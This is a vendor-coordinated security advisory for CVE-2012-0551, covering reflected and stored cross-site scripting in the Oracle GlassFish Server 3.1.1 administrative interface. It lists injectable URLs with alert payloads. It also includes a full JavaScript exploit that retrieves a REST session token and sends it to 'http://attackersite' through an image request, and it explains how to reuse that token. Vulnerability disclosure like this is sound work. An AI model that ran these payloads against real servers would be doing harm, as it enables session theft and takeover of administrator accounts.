@@ -1,0 +1,113 @@
+Details
+
+Vendor Site: Oracle (www.oracle.com)
+Date: April, 19th 2012 – CVE 2012-0551
+Affected Software: Oracle GlassFish Server 3.1.1 (build 12)
+Researcher: Roberto Suggi Liverani
+PDF version: http://www.security-assessment.com/files/documents/advisory/Oracle_GlassFish_Server_Multiple_XSS.pdf
+
+
+Description
+
+Security-Assessment.com has discovered that components of the Oracle GlassFish Server administrative web
+interface are vulnerable to both reflected  and stored  Cross Site Scripting attacks. All pages where Cross Site
+Scripting vulnerabilities were discovered require authentication.
+
+Reflected Cross Site Scripting 
+
+Reflected Cross Site Scripting was discovered in multiple parts of the application. 
+The table below details where Reflected Cross Site Scripting was detected and which parameters are vulnerable:
+
+[1] /common/applications/lifecycleEdit.jsf?appName=test%27);alert(document.cookie)//test
+
+[2] /common/security/realms/realms.jsf?configName=default-config%22%29%3balert%281%29//test
+
+[3] /web/grizzly/networkListeners.jsf?configName=default-configad217%22%29%3balert%281%29//test
+
+[4] /common/security/auditModules/auditModules.jsf?configName=904895%22);alert(1);//test
+
+[5] /common/security/jacc/jaccProviders.jsf?configName=904895%22);alert(1);//t
+
+[6] /common/security/msgSecurity/msgSecurity.jsf?configName=904895%22);alert(1);//test
+
+[7] /jms/jmsHosts.jsf?configName=904895%22);alert(1);//test
+
+[8] /web/grizzly/networkListeners.jsf?configName=904895%22);alert(1);//test
+
+[9] /web/grizzly/protocols.jsf?configName=904895%22);alert(1);//test
+
+[10] /web/grizzly/transports.jsf?configName=904895%22);alert(1);//test
+
+[11] /xhp?key=aquarium%27%3b%3Cscript%3Ealert%281%29%3C/script%3E//test    ** Works in Internet Explorer (content sniffing)
+
+Stored Cross Site Scripting
+
+The table below details where Stored Cross Site Scripting was detected and which parameters are vulnerable:
+
+Page Affected	Rendered Page	Method	Variable
+[1] /management/domain/create-password-alias - POST - id
+
+[2] /common/appServer/pswdAliasNew.jsf - POST - propertyForm%3ApropertySheet%3ApropertSectionTextField%3AaliasNameNew%3AaliasNameNew
+** requires a valid javax.faces.ViewState
+
+Exploitation 
+
+These vulnerabilities can be exploited in several ways. One example is to include an external JavaScript file, 
+such as a JavaScript hook file provided by BeEF, the browser exploitation framework. In this particular case, it 
+is possible to steal the authentication token through the REST interface, bypassing the HTTPOnly protection adopted for the JSESSIONID token in the standard web administrative interface. 
+
+Bypassing HTTPOnly protection and token theft via REST interface
+
+There is a feature in Oracle Glassfish Server which allows using cookie as a session management mechanism instead of Basic Authentication within the REST interface. 
+
+This feature can be misused using a Cross Site Scripting vulnerability. An exploit scenario for both stored and 
+reflected Cross Site Scripting vulnerabilities would be to inject a JavaScript payload which performs an XMLHTTPRequest (XHR) request to retrieve a valid session token via the REST interface. 
+
+The following exploit can be used to retrieve and steal a session token in case a user is authenticated to the REST Interface, using Basic Authentication. The token can only be used with a cookie named gfresttoken within the REST interface.
+
+Bypassing HTTPOnly and Stealing Session Token
+
+function retrieveToken() 
+{ 
+var xmlhttp; 
+if (window.XMLHttpRequest) 
+  {// code for IE7+, Firefox, Chrome, Opera, Safari 
+  xmlhttp=new XMLHttpRequest(); 
+  } 
+else 
+  {// code for IE6, IE5 
+  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); 
+  } 
+xmlhttp.onreadystatechange=function() 
+  { 
+  if (xmlhttp.readyState==4 && xmlhttp.status==200) 
+    {} 
+  } 
+xmlhttp.open("POST","/management/sessions",true); 
+xmlhttp.setRequestHeader("Accept","application/json") 
+xmlhttp.send(); 
+return xmlhttp; 
+} 
+  
+function stealToken(a) 
+{ 
+jsonObj = JSON.parse(a.responseText); // token retrieved and can be sent to attacker 
+a = document.createElement("IMG"); 
+a.setAttribute('src', 'http://attackersite/?token='+jsonObj.extraProperties.token); 
+document.body.appendChild(a); // time to grab the token 
+} 
+  
+// this exploit works with browsers that have native JSON support 
+  
+var a = retrieveToken();// perform XHR to retrieve token 
+setTimeout('stealToken(a);',12000); // needs time to load the token, then sends it to 
+attackersite 
+  
+// attacker then needs to set a cookie named gfresttoken with the token value obtained. The 
+cookie has to be valid for the domain/IP address of the target Oracle Glassfish Server
+
+Solution
+
+Oracle has created a fix for this vulnerability which has been included as part of Critical Patch Update Advisory -
+April 2012. Security-Assessment.com recommends applying the latest patch provided by the vendor.
+For more information, visit: http://www.oracle.com/technetwork/topics/security/cpuapr2012-366314.html
